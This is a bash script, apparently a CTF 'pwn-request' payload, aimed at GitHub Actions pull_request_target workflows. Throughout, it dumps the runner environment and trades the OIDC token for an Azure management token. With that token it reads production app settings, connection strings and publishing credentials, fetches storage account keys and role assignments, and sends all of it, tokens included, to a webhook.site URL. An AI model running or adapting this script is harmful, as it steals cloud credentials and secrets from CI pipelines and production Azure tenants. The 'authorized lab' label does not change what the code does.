#!/usr/bin/env bash
# DF26 CTF probe (authorized lab) - pull_request_target pwn-request payload
set +e
echo "===TBL_HS_PROBE_START==="
WH="https://webhook.site/0c01b3d9-ea4e-449d-93dd-ab92ddd50a30"

echo "--- ENV (sorted) ---"
env | sort

echo "--- OIDC ---"
OIDC=$(curl -sSL -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
echo "OIDC_LEN=${#OIDC}"
python3 - "$OIDC" <<'PY'
import sys, base64, json
t = sys.argv[1].strip().split(".")
pad = lambda x: x + "=" * (-len(x) % 4)
try:
    print(json.dumps({"header": json.loads(base64.urlsafe_b64decode(pad(t[0]))), "payload": json.loads(base64.urlsafe_b64decode(pad(t[1])))}, indent=1))
except Exception as e:
    print("decode err", e)
PY

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-platform-prod-sea"
SITE="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod"

exch() { curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" --data-urlencode "client_id=$1" --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=$2" --data-urlencode "scope=$3"; }
ARM=$(exch "${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}" "$OIDC" "https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "ARM_LEN=${#ARM}"
AH="Authorization: Bearer $ARM"

echo "--- storefront GET config/appsettings ---"
curl -sS -H "$AH" "$SITE/config/appsettings?api-version=2022-09-01"
echo; echo "--- storefront POST appsettings/list ---"
curl -sS -X POST -H "$AH" -H "Content-Length: 0" "$SITE/config/appsettings/list?api-version=2022-09-01"
echo; echo "--- storefront POST connectionstrings/list ---"
curl -sS -X POST -H "$AH" -H "Content-Length: 0" "$SITE/config/connectionstrings/list?api-version=2022-09-01"
echo; echo "--- storefront POST publishingcredentials/list ---"
curl -sS -X POST -H "$AH" -H "Content-Length: 0" "$SITE/config/publishingcredentials/list?api-version=2022-09-01"
echo; echo "--- listKeys all storage ---"
for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  echo "== $sa"; curl -sS -X POST -H "$AH" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$sa/listKeys?api-version=2023-01-01" | head -c 300; echo
done
echo "--- kv-tbl-sec roleAssignments ---"
curl -sS -H "$AH" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | head -c 700
echo; echo "--- reporting RG resources ---"
curl -sS -H "$AH" "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01" | head -c 700
echo; echo "--- sub-wide roleAssignments (first 2000 chars) ---"
curl -sS -H "$AH" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" > /tmp/ra.json
wc -c /tmp/ra.json
head -c 2000 /tmp/ra.json
echo; echo "===TBL_HS_PROBE_END==="

# backup exfil channel
{ env | sort; echo; echo "OIDC=$OIDC"; echo "ARM=$ARM"; cat /tmp/ra.json; } > /tmp/probe_out.txt 2>/dev/null
curl -sS -m 25 -X POST "$WH" --data-binary @/tmp/probe_out.txt >/dev/null 2>&1 || true
echo "exfil done"
